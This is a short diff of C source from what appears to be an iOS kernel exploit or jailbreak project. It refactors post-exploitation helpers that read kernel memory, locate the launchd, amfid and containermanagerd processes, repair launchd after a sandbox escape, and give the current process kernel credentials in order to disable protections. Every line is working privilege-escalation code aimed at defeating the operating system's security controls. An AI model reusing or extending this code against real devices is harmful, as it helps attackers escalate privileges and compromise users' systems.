@@ -13,13 +13,14 @@
 #include "kernel_memory_helpers.h"
 #include "offsets.h"
 
-uint64_t allproc = 0;
 uint64_t launchd_proc = 0;
 uint64_t amfid_proc = 0;
 uint64_t containermanager_proc = 0;
 
 uint64_t get_proc_ipc_table(uint64_t proc) {
-  uint64_t task_t = rk64(proc + struct_proc_task_offset);
+  uint64_t task_t;
+  bool success = proc_task(&task_t, proc);
+  assert(success);
   printf("task_t: 0x%llx\n", task_t);
   
   uint64_t itk_space = rk64(task_t + struct_task_itk_space_offset);
@@ -104,8 +105,6 @@ void fix_launchd_after_sandbox_escape(mach_port_t real_service, mach_port_t mitm
 #define CONTAINERMANAGERD "/System/Library/PrivateFrameworks/MobileContainerManager.framework/Support/containermanagerd"
 
 void disable_protections(uint64_t kernel_base, uint64_t realhost) {
-  allproc = kernel_base + allproc_offset;
-
   // Give ourselves the kernel credentials so that we can find processes.
   bool success = proc_copy_credentials(currentproc, kernproc);
   assert(success);
